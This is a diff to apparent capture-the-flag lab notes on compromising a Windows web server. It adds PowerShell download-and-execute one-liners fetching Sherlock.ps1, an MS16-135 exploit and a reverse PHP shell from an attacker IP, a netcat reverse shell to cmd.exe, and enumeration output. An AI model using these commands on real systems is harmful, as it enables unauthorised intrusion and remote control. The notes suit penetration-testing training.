@@ -87,7 +87,14 @@ Ethernet adapter Ethernet0:
    IPv4 Address. . . . . . . . . . . : 10.10.10.198 
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:9eb2%10
-                                       10.10.10.2                                                                 
+                                       10.10.10.2  
+                                       
+
+C:\xampp\htdocs\gym\upload> type C:\Users\shaun\Desktop\user.txt
+�PNG
+
+7ddf32e17a6ac5ce04a8ecbf782ca509
+
 ```
 * Systeminfo
 ```
@@ -217,7 +224,256 @@ r Memory Corruption (MS15-056)
 [*] done                                                                                                          
 ```
 
-* Sherlock
+* Trigger another reverse webshell
 ```
-powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.12:8000/Sherlock.ps1')
+powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/reverse.php', 'C:\xampp\htdocs\gym\upload\reverse.php')
 ```
+
+* Use Sherlock.ps1
+```
+powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/Sherlock.ps1')                       
+                                                                                                                  
+                                                                                                                  
+                                                                                                                  
+Title      : User Mode to Ring (KiTrap0D)                                                                         
+MSBulletin : MS10-015                                                                                             
+CVEID      : 2010-0232                                                                                            
+Link       : https://www.exploit-db.com/exploits/11199/                                                           
+VulnStatus : Not supported on 64-bit systems                                                                      
+                                                                                                                  
+Title      : Task Scheduler .XML                                                                                  
+MSBulletin : MS10-092                                                                                             
+CVEID      : 2010-3338, 2010-3888                                                                                 
+Link       : https://www.exploit-db.com/exploits/19930/                                                           
+VulnStatus : Not Vulnerable                                                                                       
+                                                                                                                  
+Title      : NTUserMessageCall Win32k Kernel Pool Overflow                                                        
+MSBulletin : MS13-053                                                                                             
+CVEID      : 2013-1300                                                                                            
+Link       : https://www.exploit-db.com/exploits/33213/                                                           
+VulnStatus : Not supported on 64-bit systems                                                                      
+
+Title      : TrackPopupMenuEx Win32k NULL Page
+MSBulletin : MS13-081
+CVEID      : 2013-3881
+Link       : https://www.exploit-db.com/exploits/31576/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : TrackPopupMenu Win32k Null Pointer Dereference
+MSBulletin : MS14-058
+CVEID      : 2014-4113
+Link       : https://www.exploit-db.com/exploits/35101/
+VulnStatus : Not Vulnerable
+
+Title      : ClientCopyImage Win32k
+MSBulletin : MS15-051
+CVEID      : 2015-1701, 2015-2433
+Link       : https://www.exploit-db.com/exploits/37367/
+VulnStatus : Not Vulnerable
+
+Title      : Font Driver Buffer Overflow
+MSBulletin : MS15-078
+CVEID      : 2015-2426, 2015-2433
+Link       : https://www.exploit-db.com/exploits/38222/
+VulnStatus : Not Vulnerable
+Title      : 'mrxdav.sys' WebDAV                                                                                  
+MSBulletin : MS16-016                                                                                             
+CVEID      : 2016-0051                                                                                            
+Link       : https://www.exploit-db.com/exploits/40085/                                                           
+VulnStatus : Not supported on 64-bit systems                                                                      
+                                                                                                                  
+Title      : Secondary Logon Handle                                                                               
+MSBulletin : MS16-032                                                                                             
+CVEID      : 2016-0099                                                                                            
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Not Vulnerable                              
+                            
+Title      : Windows Kernel-Mode Drivers EoP
+MSBulletin : MS16-034                                    
+CVEID      : 2016-0093/94/95/96             
+Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
+VulnStatus : Not Vulnerable                                                                                       
+                            
+Title      : Win32k Elevation of Privilege
+MSBulletin : MS16-135                                    
+CVEID      : 2016-7255     
+Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
+VulnStatus : Not Vulnerable                              
+                            
+Title      : Nessus Agent 6.6.2 - 6.10.3
+MSBulletin : N/A                                         
+CVEID      : 2017-7199     
+Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
+VulnStatus : Not Vulnerable                              
+```
+* Test MS16-135. Blocked by AV.
+```
+powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/MS16-135.ps1')                       
+
+IEX : At line:1 char:1
++ Add-Type -TypeDefinition @"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+At line:1 char:1
++ IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/MS1 ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+```
+* Dropped nc.exe into target machine. Trigger Reverse Shell. Used WinPEAS.bat.
+
+```
+powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/nc.exe', 'C:\Users\shaun\Desktop\nc.exe')
+
+nc.exe -nv 10.10.14.10 4444 -e cmd.exe
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] RUNNING PROCESSES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-                             
+[i] Something unexpected is running? Check for vulnerabilities                                                    
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes                    
+                                                                                                                  
+Image Name                     PID Services                                                                       
+========================= ======== ============================================                                   
+System Idle Process              0 N/A                                                                            
+System                           4 N/A                                                                            
+Registry                       104 N/A                                                                            
+smss.exe                       364 N/A                                                                            
+csrss.exe                      440 N/A                                                                            
+wininit.exe                    516 N/A                                                                            
+csrss.exe                      524 N/A                                                                            
+winlogon.exe                   588 N/A                                                                            
+services.exe                   664 N/A                                                                            
+lsass.exe                      676 N/A                                                                            
+svchost.exe                    792 N/A                                                                            
+fontdrvhost.exe                816 N/A                                                                            
+fontdrvhost.exe                824 N/A                                                                            
+svchost.exe                    832 N/A                                                                            
+svchost.exe                    936 N/A                                                                            
+svchost.exe                    980 N/A                                                                            
+dwm.exe                        328 N/A                                                                            
+svchost.exe                    352 N/A                                                                            
+svchost.exe                    740 N/A                                                                            
+svchost.exe                     68 N/A                                                                            
+svchost.exe                   1028 N/A                                                                            
+svchost.exe                   1052 N/A                                                                            
+svchost.exe                   1076 N/A                                                                            
+svchost.exe                   1196 N/A                                                                            
+svchost.exe                   1228 N/A                                                                            
+svchost.exe                   1360 N/A                                                                            
+svchost.exe                   1368 N/A                                                                            
+svchost.exe                   1376 N/A                                                                            
+svchost.exe                   1384 N/A                                                                            
+svchost.exe                   1480 N/A                                                                            
+svchost.exe                   1544 N/A                                                                            
+Memory Compression            1608 N/A                                                                            
+svchost.exe                   1668 N/A                                                                            
+svchost.exe                   1696 N/A                                                                            
+svchost.exe                   1756 N/A                                                                            
+svchost.exe                   1764 N/A                                                                            
+svchost.exe                   1808 N/A                                                                            
+svchost.exe                   1912 N/A                                                                            
+svchost.exe                   1928 N/A                                                                            
+svchost.exe                   1112 N/A      
+svchost.exe                   1300 N/A                                          
+svchost.exe                   1716 N/A                                          
+svchost.exe                   2060 N/A                                          
+svchost.exe                   2072 N/A                                          
+spoolsv.exe                   2184 N/A                                          
+svchost.exe                   2292 N/A                                          
+svchost.exe                   2324 N/A                                          
+svchost.exe                   2692 N/A                                          
+svchost.exe                   2704 N/A                                          
+svchost.exe                   2720 N/A                                          
+vmtoolsd.exe                  2728 N/A                                          
+VGAuthService.exe             2736 N/A                                          
+svchost.exe                   2744 N/A                                          
+svchost.exe                   2756 N/A                                          
+SecurityHealthService.exe     2772 N/A                                          
+svchost.exe                   2780 N/A                                          
+svchost.exe                   2788 N/A                                          
+MsMpEng.exe                   2796 N/A                                          
+svchost.exe                   2860 N/A                                          
+svchost.exe                   1316 N/A                                          
+svchost.exe                   2336 N/A                                          
+svchost.exe                   3076 N/A                                          
+dllhost.exe                   3592 N/A                                          
+WmiPrvSE.exe                  3816 N/A                                          
+msdtc.exe                     4084 N/A                                          
+svchost.exe                   4212 N/A                                          
+sihost.exe                    4272 N/A                                          
+svchost.exe                   4296 N/A                                          
+svchost.exe                   4364 N/A                                          
+taskhostw.exe                 4504 N/A                                          
+svchost.exe                   4596 N/A                                          
+ctfmon.exe                    4644 N/A                                          
+svchost.exe                   4652 N/A                                          
+explorer.exe                  2112 N/A                                          
+NisSrv.exe                    5448 N/A                                          
+svchost.exe                   5676 N/A                                          
+svchost.exe                   5748 N/A                                          
+svchost.exe                   5840 N/A                                          
+ShellExperienceHost.exe       5136 N/A                                          
+svchost.exe                    880 N/A                                          
+svchost.exe                   6208 N/A                                          
+SearchUI.exe                  6292 N/A                                          
+RuntimeBroker.exe             6472 N/A                                          
+ApplicationFrameHost.exe      6712 N/A                                          
+RuntimeBroker.exe             6736 N/A                                          
+SearchIndexer.exe             6848 N/A                                          
+MicrosoftEdge.exe             6964 N/A                                          
+svchost.exe                   7076 N/A                                          
+browser_broker.exe            7088 N/A                                          
+RuntimeBroker.exe             7124 N/A                                          
+Windows.WARP.JITService.e     2628 N/A                                          
+svchost.exe                   7268 N/A                                          
+RuntimeBroker.exe             7356 N/A                                          
+MicrosoftEdgeCP.exe           7744 N/A                                          
+MicrosoftEdgeCP.exe           7808 N/A                                          
+MSASCuiL.exe                  7960 N/A                                          
+vmtoolsd.exe                  5564 N/A                                          
+conhost.exe                   8520 N/A           
+httpd.exe                     8776 N/A                                          
+mysqld.exe                    8816 N/A                                          
+svchost.exe                   5368 N/A                                          
+httpd.exe                     6552 N/A                                          
+svchost.exe                   1452 N/A                                          
+SgrmBroker.exe                2392 N/A                                          
+svchost.exe                   5372 N/A                                          
+svchost.exe                   2896 N/A                                          
+Microsoft.Photos.exe          1720 N/A                                          
+RuntimeBroker.exe             8344 N/A                                          
+WinStore.App.exe              4924 N/A                                          
+RuntimeBroker.exe             3336 N/A                                          
+SystemSettings.exe            5552 N/A                                          
+taskhostw.exe                 4132 N/A                                          
+TrustedInstaller.exe          6720 N/A                                          
+wermgr.exe                    6544 N/A                                          
+TiWorker.exe                   528 N/A                                          
+svchost.exe                   9192 N/A                                          
+svchost.exe                   6764 N/A                                          
+svchost.exe                   8172 N/A                                          
+svchost.exe                    536 N/A                                          
+cmd.exe                       7636 N/A                                          
+conhost.exe                   4948 N/A                                          
+nc.exe                        7432 N/A                                          
+cmd.exe                       7164 N/A                                          
+cmd.exe                        844 N/A                                          
+conhost.exe                   2084 N/A                                          
+WmiPrvSE.exe                  1516 N/A                                          
+CloudMe.exe                   1572 N/A                                          
+timeout.exe                   6092 N/A                                          
+tasklist.exe                  8500 N/A        
+
+
+PRIVILEGES INFORMATION                                                                                            
+----------------------                                                                                            
+                                                                                                                  
+Privilege Name                Description                          State                                          
+============================= ==================================== ========                                       
+SeShutdownPrivilege           Shut down the system                 Disabled                                       
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled                                        
+SeUndockPrivilege             Remove computer from docking station Disabled                                       
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled                                       
+SeTimeZonePrivilege           Change the time zone                 Disabled                                       
+                                                                                                                  
+ERROR: Unable to get user claims information.                                                                     
+                                                                                                                  
+                                                                                   
